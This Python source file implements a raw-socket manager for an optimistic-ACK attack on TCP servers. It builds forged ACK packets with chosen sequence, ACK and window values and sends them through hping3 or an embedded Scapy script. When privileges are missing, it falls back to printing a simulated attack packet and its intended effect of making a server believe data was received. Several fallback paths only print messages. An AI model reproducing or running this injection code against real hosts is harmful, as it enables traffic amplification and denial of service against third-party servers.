import socket
import random
import threading
import sys
import platform
import subprocess
import time

class RawSocketManager:
    def __init__(self):
        self.raw_socket = None
        self.connections = {}
        self.is_initialized = False
        self.local_ip = ''
        self.local_port = 0
        # Initialization is not immediate; must call initialize()

    def initialize(self):
        if self.is_initialized:
            return
        print('🔧 Initializing raw socket manager...')
        # Get local IP first
        self.local_ip = self.get_local_ip()
        self.local_port = random.randint(20000, 50000)
        try:
            # Try to create raw socket (requires privileges)
            try:
                self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                print('✅ Raw socket created successfully')
            except Exception as socket_error:
                print('⚠️  Raw socket creation failed (expected without root):', socket_error)
                self.raw_socket = None
            self.is_initialized = True
            print(f'🔧 Raw socket manager initialized (Local: {self.local_ip}:{self.local_port})')
            if not self.raw_socket:
                print('💡 Operating in socket manipulation mode (no raw sockets)')
            else:
                print('⚠️  Raw packet injection available (requires root for full functionality)')
        except Exception as error:
            print('❌ Failed to initialize socket manager:', error)
            self.is_initialized = True  # Set to true anyway to allow simulation mode

    def get_local_ip(self):
        try:
            # Get outbound interface IP by connecting to a public IP (won't actually send)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'

    def send_packet(self, packet):
        if not self.is_initialized:
            raise Exception('Socket manager not initialized. Call initialize() first.')

        try:
            # Try to send real raw TCP packet
            if self.send_raw_tcp_packet(packet):
                return
            # Fallback to socket manipulation
            if self.send_via_socket_manipulation(packet):
                return
            # Last resort - simulate packet effects
            self.simulate_optimistic_ack(packet)
        except Exception as error:
            print('Packet sending failed, using simulation:', error)
            self.simulate_optimistic_ack(packet)

    def send_raw_tcp_packet(self, packet):
        try:
            system = platform.system().lower()
            if system == 'linux':
                return self.send_linux_raw_packet(packet)
            elif system == 'windows':
                return self.send_windows_raw_packet(packet)
            elif system == 'darwin':
                return self.send_macos_raw_packet(packet)
            return False
        except Exception as error:
            print('Raw packet sending failed:', error)
            return False

    def send_linux_raw_packet(self, packet):
        try:
            # Check if hping3 is available
            if subprocess.call(['which', 'hping3'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                print('📦 hping3 not found, trying Python scapy...')
                return self.send_via_python(packet)
            command = [
                'timeout', '5', 'hping3', '-c', '1', '-A',
                '-p', str(packet['dest_port']),
                '-s', str(packet['source_port']),
                '-M', str(packet['ack_number']),
                '-w', str(packet['window_size']),
                packet['dest_ip']
            ]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if 'Operation not permitted' not in result.stderr:
                return True
            else:
                print('🔒 hping3 requires root privileges, falling back...')
                return False
        except Exception:
            return self.send_via_python(packet)

    def send_via_python(self, packet):
        # Attempts to use scapy if available
        scapy_script = f"""
import sys
try:
    from scapy.all import *
    import os
    if os.geteuid() != 0:
        print("NEED_ROOT")
        sys.exit(1)
    ip = IP(src="{packet['source_ip']}", dst="{packet['dest_ip']}")
    tcp = TCP(sport={packet['source_port']}, dport={packet['dest_port']},
              flags="A", seq={packet['sequence_number']}, ack={packet['ack_number']},
              window={packet['window_size']})
    pkt = ip/tcp
    send(pkt, verbose=0)
    print("SUCCESS")
except ImportError:
    print("SCAPY_NOT_FOUND")
except Exception as e:
    print(f"ERROR: {{e}}")
"""
        proc = subprocess.Popen(
            ['python3', '-c', scapy_script],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        out, err = proc.communicate()
        if "SUCCESS" in out:
            print(f'🐍 Raw TCP packet sent via Scapy: ACK={packet["ack_number"]}')
            return True
        elif "NEED_ROOT" in out:
            print('🔒 Python scapy requires root privileges')
            return False
        elif "SCAPY_NOT_FOUND" in out:
            print('📦 Python scapy not installed')
            return False
        return False

    def send_windows_raw_packet(self, packet):
        print('💻 Windows raw packet injection not implemented yet')
        return False

    def send_macos_raw_packet(self, packet):
        return self.send_linux_raw_packet(packet)

    def send_via_socket_manipulation(self, packet):
        try:
            connection_key = f"{packet['dest_ip']}:{packet['dest_port']}"
            sock = self.connections.get(connection_key)
            if not sock or getattr(sock, 'closed', False):
                print(f"🔌 Socket manipulation: Would send ACK via existing connection")
                return True
            if sock:
                print(f"🔌 Socket manipulation: Simulated ACK behavior (ACK={packet['ack_number']})")
                return True
            return False
        except Exception:
            return False

    def simulate_optimistic_ack(self, packet):
        print(f"📦 OPTIMISTIC ACK PACKET (Simulated - no root access):")
        print(f"├─ {packet['source_ip']}:{packet['source_port']} → {packet['dest_ip']}:{packet['dest_port']}")
        print(f"├─ SEQ: {packet['sequence_number']} | ACK: {packet['ack_number']} (OPTIMISTIC +{packet['ack_number']})")
        print(f"├─ Window: {packet['window_size']} bytes")
        print(f"├─ Flags: ACK")
        print(f"└─ Effect: Would make server think client received {packet['ack_number']} bytes")

    def establish_connection(self, target_ip, target_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.settimeout(10)
        try:
            sock.connect((target_ip, target_port))
            print(f"🔗 TCP connection established to {target_ip}:{target_port}")
            self.local_ip, self.local_port = sock.getsockname()
            connection_key = f"{target_ip}:{target_port}"
            self.connections[connection_key] = sock
            return sock
        except Exception as error:
            print(f"❌ Connection error: {error}")
            sock.close()
            return None

    def get_local_endpoint(self):
        return {'ip': self.local_ip, 'port': self.local_port}

    def is_ready(self):
        return self.is_initialized

    def close(self):
        for key, sock in self.connections.items():
            try:
                sock.close()
                print(f"🔌 Closed connection to {key}")
            except Exception:
                pass
        self.connections.clear()
        if self.raw_socket:
            self.raw_socket.close()
            self.raw_socket = None
        self.is_initialized = False
        print("🛑 Raw socket manager closed")

# Note: You'd replace the packet dicts with a suitable dataclass or dict.
